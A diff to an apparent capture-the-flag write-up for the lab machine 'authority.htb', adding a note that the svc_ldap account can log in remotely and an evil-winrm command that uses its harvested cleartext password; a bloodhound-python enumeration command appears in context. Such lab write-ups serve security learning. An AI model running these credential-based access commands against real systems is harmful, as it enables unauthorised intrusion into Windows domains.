@@ -527,10 +527,15 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 ```
 sudo bloodhound-python -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -ns 10.129.229.56 -d authority.htb -c all --zip
 ```
+
+svc_ldap is memeber of remote management users
+
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
+```
+evil-winrm -i authority.htb -u svc_ldap -p lDaP_1n_th3_cle4r!
+```
 
 Steps to move from initial foothold to user access.
 
